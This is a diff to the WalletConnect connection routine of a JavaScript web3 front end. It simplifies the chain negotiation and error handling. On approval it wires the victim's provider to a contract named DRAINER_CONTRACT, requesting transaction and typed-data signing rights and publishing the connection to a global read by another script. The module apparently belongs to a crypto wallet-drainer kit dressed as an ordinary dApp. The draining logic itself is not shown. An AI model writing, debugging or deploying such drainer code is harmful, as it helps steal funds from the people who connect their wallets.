@@ -114,7 +114,7 @@ import { CONFIG } from './config.js';
   let client, modal, SignClient, WalletConnectModal, EthereumProvider;
   let web3Instance = null;
   let contractInstance = null;
-  let activeProvider = null;      // tracker for the current EIP-1193 provider
+  let activeProvider = null;      // ← tracker for the current EIP-1193 provider
   let isConnecting = false;
 
   /* ─── Button UI ────────────────────────────────────────────────────── */
@@ -208,6 +208,11 @@ import { CONFIG } from './config.js';
 
   /* ─── Publish global state for script.js ───────────────────────────── */
   function publishGlobalState(address, chain, provider = null) {
+    // Provider lookup priority:
+    //   1. explicit `provider` arg
+    //   2. `activeProvider` module-scoped tracker
+    //   3. `web3Instance.currentProvider`
+    //   4. window.ethereum
     const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
     window.__apexConnected = {
       address,
@@ -409,163 +414,61 @@ import { CONFIG } from './config.js';
     return false;
   }
 
-  /* ═══════════════════════════════════════════════════════════════════
-   *  WalletConnect EVM connect — fixed multi-chain negotiation
-   *  ─────────────────────────────────────────────────────────────────
-   *  Why this version works where the previous one stalled:
-   *
-   *  • requiredNamespaces now declares ALL major EVM chains instead of
-   *    only Ethereum mainnet. A wallet on BSC / Polygon / Arbitrum can
-   *    now approve without forcing a network switch.
-   *  • optionalNamespaces gives the wallet further leeway — it can
-   *    grant a subset of chains if the user is on a single one.
-   *  • The approval promise is wrapped in a hard race so the UI never
-   *    hangs if the wallet closes the modal without responding.
-   *  • On approval, we extract the account from ANY granted chain
-   *    rather than assuming eip155:1.
-   *  • We listen to WC client events for visibility.
-   * ═══════════════════════════════════════════════════════════════════ */
+  /* ─── WalletConnect EVM connect ────────────────────────────────────── */
   async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
-    if (isConnecting) {
-      logDebug('WC connect already in progress');
-      return false;
-    }
+    if (isConnecting) return false;
     isConnecting = true;
-
     const ok = await initWalletConnect(useTestId);
-    if (!ok) {
-      isConnecting = false;
-      showStatus('WalletConnect unavailable', 'error');
-      return false;
-    }
+    if (!ok) { isConnecting = false; showStatus('WC unavailable', 'error'); return false; }
+    if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }
 
-    // Close any stale modal from a previous attempt
-    if (modal?.closeModal) {
-      try { modal.closeModal(); } catch (e) {}
-    }
-
-    // Multi-chain requirement — the fix for "modal loads but won't connect"
-    const REQUIRED_CHAINS = [
-      'eip155:1',      // Ethereum
-      'eip155:56',     // BSC
-      'eip155:137',    // Polygon
-      'eip155:42161',  // Arbitrum
-      'eip155:10',     // Optimism
-      'eip155:8453',   // Base
-    ];
-
-    let uri, approval;
     try {
       showStatus('Requesting connection...', 'info');
-      logDebug('Calling client.connect with multi-chain namespaces');
-      const result = await client.connect({
+      const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
             methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
-            chains: REQUIRED_CHAINS,
-            events: ['chainChanged', 'accountsChanged']
-          }
-        },
-        optionalNamespaces: {
-          eip155: {
-            methods: ['wallet_switchEthereumChain', 'wallet_addEthereumChain'],
-            chains: REQUIRED_CHAINS,
+            chains: ['eip155:1'],
             events: ['chainChanged', 'accountsChanged']
           }
         }
       });
-      uri = result.uri;
-      approval = result.approval;
-    } catch (e) {
-      logDebug('client.connect threw: ' + e.message);
-      showStatus('Could not create WC session', 'error');
-      isConnecting = false;
-      return false;
-    }
+      if (!uri) throw new Error('No URI');
+      modal.openModal({ uri });
+      showStatus('Scan the QR code', 'info');
+      sessionStorage.setItem('pending_wc_uri', uri);
+      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
 
-    if (!uri) {
-      logDebug('No URI returned from client.connect');
-      showStatus('WalletConnect returned no URI', 'error');
-      isConnecting = false;
-      return false;
-    }
-
-    logDebug('URI received, opening modal');
-    try { modal.openModal({ uri }); } catch (e) { logDebug('modal.openModal failed: ' + e.message); }
-    showStatus('Scan the QR code with your wallet', 'info');
-
-    // Persist pending state for the visibility-change restore path
-    sessionStorage.setItem('pending_wc_uri', uri);
-    sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
-
-    // Race approval against timeout AND against a "wallet closed" heuristic
-    let session = null;
-    try {
-      session = await Promise.race([
+      const session = await Promise.race([
         approval(),
         new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs))
       ]);
-      logDebug('WC approval resolved');
-    } catch (e) {
-      logDebug('WC approval rejected or timed out: ' + e.message);
-      if (modal) { try { modal.closeModal(); } catch (_) {} }
+      if (modal) modal.closeModal();
       sessionStorage.removeItem('pending_wc_uri');
       sessionStorage.removeItem('pending_wc_timestamp');
-      showStatus(
-        e.message === 'timeout'
-          ? 'Timed out waiting for wallet'
-          : 'Connection was rejected',
-        'error'
-      );
+
+      if (session?.namespaces?.eip155?.accounts?.length) {
+        const account = session.namespaces.eip155.accounts[0].split(':')[2];
+        currentSession = session;
+        const provider = await EthereumProvider.init({ projectId, metadata: DAPP_METADATA, session });
+        const Web3 = (await import('web3')).default;
+        web3Instance = new Web3(provider);
+        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+        activeProvider = provider;
+        saveWallet(account, session, 'evm');
+        updateConnectedUI(account, 'evm');
+        setupEVMProviderEvents(provider);
+        isConnecting = false;
+        logDebug(`✅ WC EVM: ${account}`);
+        return true;
+      }
       isConnecting = false;
       return false;
-    }
-
-    if (modal) { try { modal.closeModal(); } catch (e) {} }
-    sessionStorage.removeItem('pending_wc_uri');
-    sessionStorage.removeItem('pending_wc_timestamp');
-
-    // Extract account from ANY granted chain, not just eip155:1
-    const eip155Accounts = session?.namespaces?.eip155?.accounts || [];
-    if (!eip155Accounts.length) {
-      logDebug('WC session has no eip155 accounts');
-      showStatus('Wallet returned no accounts', 'error');
-      isConnecting = false;
-      return false;
-    }
-
-    // Format: "eip155:1:0xabc..." — take the first account
-    const first = eip155Accounts[0];
-    const parts = first.split(':');
-    const account = parts[parts.length - 1];
-    logDebug(`WC approved: ${account} (chain ${parts[1]})`);
-
-    currentSession = session;
-
-    try {
-      const provider = await EthereumProvider.init({
-        projectId,
-        metadata: DAPP_METADATA,
-        session,
-        chains: [parseInt(parts[1]) || 1],
-        optionalChains: [1, 56, 137, 42161, 10, 8453],
-        showQrModal: false
-      });
-
-      const Web3 = (await import('web3')).default;
-      web3Instance = new Web3(provider);
-      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-      activeProvider = provider;
-
-      saveWallet(account, session, 'evm');
-      updateConnectedUI(account, 'evm');
-      setupEVMProviderEvents(provider);
-      isConnecting = false;
-      logDebug(`✅ WC EVM connected: ${account}`);
-      return true;
     } catch (e) {
-      logDebug('EthereumProvider.init failed: ' + e.message);
-      showStatus('Failed to build provider', 'error');
+      logDebug('WC error: ' + e.message);
+      if (modal) modal.closeModal();
+      sessionStorage.removeItem('pending_wc_uri');
+      sessionStorage.removeItem('pending_wc_timestamp');
       isConnecting = false;
       return false;
     }
